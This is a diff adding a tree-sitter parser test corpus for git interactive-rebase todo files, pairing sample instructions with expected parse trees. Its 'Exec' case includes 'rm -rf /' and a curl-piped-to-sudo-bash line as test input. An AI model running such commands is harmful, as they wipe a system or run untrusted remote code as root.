@@ -1,0 +1,383 @@
+================================================================================
+Pick, reword, edit, squash, drop
+================================================================================
+
+pick 6017bf5 clean up sway config, add wofi-emoji
+p 6017bf5
+reword aff0d8c reorg kitty extraConfig to keybindings section
+r 1c2a2b8
+edit 1381af0 helix: underline parameters
+e 27354e4
+squash 5053c6f helix: lower idle timeout in config
+s 7b6c8cf
+drop 7b6c8cf update unstable
+d a8f8aa0
+
+--------------------------------------------------------------------------------
+
+(source
+  (operation
+    (command)
+    (label)
+    (message))
+  (operation
+    (command)
+    (label))
+  (operation
+    (command)
+    (label)
+    (message))
+  (operation
+    (command)
+    (label))
+  (operation
+    (command)
+    (label)
+    (message))
+  (operation
+    (command)
+    (label))
+  (operation
+    (command)
+    (label)
+    (message))
+  (operation
+    (command)
+    (label))
+  (operation
+    (command)
+    (label)
+    (message))
+  (operation
+    (command)
+    (label)))
+
+================================================================================
+Fixup
+================================================================================
+
+fixup 3fb04ec add clipman for wl-clipboard history
+fixup -C 833c07a add gnome3.adwaita-icon-theme, fixing wofi lens/search icon
+fixup -c dd60ebd style and config wofi
+f 4f50bd5
+f -C 8e16698
+f -c 6017bf5
+
+--------------------------------------------------------------------------------
+
+(source
+  (operation
+    (command)
+    (label)
+    (message))
+  (operation
+    (command)
+    (option)
+    (label)
+    (label)
+    (message))
+  (operation
+    (command)
+    (option)
+    (label)
+    (label)
+    (message))
+  (operation
+    (command)
+    (label))
+  (operation
+    (command)
+    (option)
+    (label))
+  (operation
+    (command)
+    (option)
+    (label)))
+
+================================================================================
+update-ref
+================================================================================
+
+update-ref origin/master
+update-ref test
+u origin/master
+u test
+
+--------------------------------------------------------------------------------
+
+(source
+  (operation
+    (command)
+    (label))
+  (operation
+    (command)
+    (label))
+  (operation
+    (command)
+    (label))
+  (operation
+    (command)
+    (label)))
+
+================================================================================
+Exec
+================================================================================
+
+exec rm -rf /
+x curl http://example.com/gotcha.sh | sudo bash
+
+--------------------------------------------------------------------------------
+
+(source
+  (operation
+    (command)
+    (message))
+  (operation
+    (command)
+    (message)))
+
+================================================================================
+Break
+================================================================================
+
+break
+b
+
+--------------------------------------------------------------------------------
+
+(source
+  (operation
+    (command))
+  (operation
+    (command)))
+
+================================================================================
+Label, reset
+================================================================================
+
+label v0.20.1
+l v0.20.1
+
+reset v0.20.0
+t v0.20.0
+
+label v1.0.0 wohoo!
+
+--------------------------------------------------------------------------------
+
+(source
+  (operation
+    (command)
+    (label))
+  (operation
+    (command)
+    (label))
+  (operation
+    (command)
+    (label))
+  (operation
+    (command)
+    (label))
+  (operation
+    (command)
+    (label)
+    (message)))
+
+================================================================================
+Merges
+================================================================================
+
+merge some-other-branch # Merge pull request #123 from some-other-branch
+merge some-other-branch
+merge -C 3fb04ec some-other-branch # Merge pull request #123 from some-other-branch
+merge -C 3fb04ec some-other-branch
+merge -c 3fb04ec some-other-branch
+
+--------------------------------------------------------------------------------
+
+(source
+  (operation
+    (command)
+    (label)
+    (message))
+  (operation
+    (command)
+    (label))
+  (operation
+    (command)
+    (option)
+    (label)
+    (label)
+    (message))
+  (operation
+    (command)
+    (option)
+    (label)
+    (label))
+  (operation
+    (command)
+    (option)
+    (label)
+    (label)))
+
+================================================================================
+git rebase --interactive --rebase-merges
+================================================================================
+
+label onto
+
+# Branch main
+reset onto
+pick f1d7f2f remove ca-references experimental nix feature
+label main
+
+# Branch main-2
+reset main # remove ca-references experimental nix feature
+pick fc88cb0 add CET timezone to timezone section of waybar
+label main-2
+
+reset main-2 # add CET timezone to timezone section of waybar
+merge -C 3fb04ec some-other-branch # Merge pull request #123 from some-other-branch
+
+
+--------------------------------------------------------------------------------
+
+(source
+  (operation
+    (command)
+    (label))
+  (comment)
+  (operation
+    (command)
+    (label))
+  (operation
+    (command)
+    (label)
+    (message))
+  (operation
+    (command)
+    (label))
+  (comment)
+  (operation
+    (command)
+    (label)
+    (message))
+  (operation
+    (command)
+    (label)
+    (message))
+  (operation
+    (command)
+    (label))
+  (operation
+    (command)
+    (label)
+    (message))
+  (operation
+    (command)
+    (option)
+    (label)
+    (label)
+    (message)))
+
+================================================================================
+Single-line operation with newline ending
+================================================================================
+pick 6017bf5 clean up sway config, add wofi-emoji
+
+--------------------------------------------------------------------------------
+
+(source
+  (operation
+    (command)
+    (label)
+    (message)))
+
+================================================================================
+Single-line operation with no newline ending
+================================================================================
+pick 6017bf5 clean up sway config, add wofi-emoji
+--------------------------------------------------------------------------------
+
+(source
+  (operation
+    (command)
+    (label)
+    (message)))
+
+================================================================================
+Single-line comment with no newline ending
+================================================================================
+# goodbye, newline!
+--------------------------------------------------------------------------------
+
+(source
+  (comment))
+
+================================================================================
+Two Single-line comments with no newline ending
+================================================================================
+# goodbye, newline!
+# goodbye, newline!
+--------------------------------------------------------------------------------
+
+(source
+  (comment)
+  (comment))
+
+================================================================================
+Single-line operation with preceeding space
+================================================================================
+   pick 51ff58f add gitcommit grammar and language configuration
+--------------------------------------------------------------------------------
+
+(source
+  (operation
+    (command)
+    (label)
+    (message)))
+
+================================================================================
+One line of comments with following pick
+================================================================================
+# first line comment
+pick 6017bf5 # I know that i'm alone
+--------------------------------------------------------------------------------
+
+(source
+  (comment)
+  (operation
+    (command)
+    (label)
+    (message)))
+
+
+================================================================================
+One line of comments with semicolon
+================================================================================
+; first line comment
+pick 6017bf5 # I know that i'm alone
+--------------------------------------------------------------------------------
+
+(source
+  (comment)
+  (operation
+    (command)
+    (label)
+    (message)))
+
+================================================================================
+Two lines of comments with following picks
+================================================================================
+# first line comment
+# second line comment
+pick 6017bf5 # I know that i'm naive
+--------------------------------------------------------------------------------
+
+(source
+  (comment)
+  (comment)
+  (operation
+    (command)
+    (label)
+    (message)))
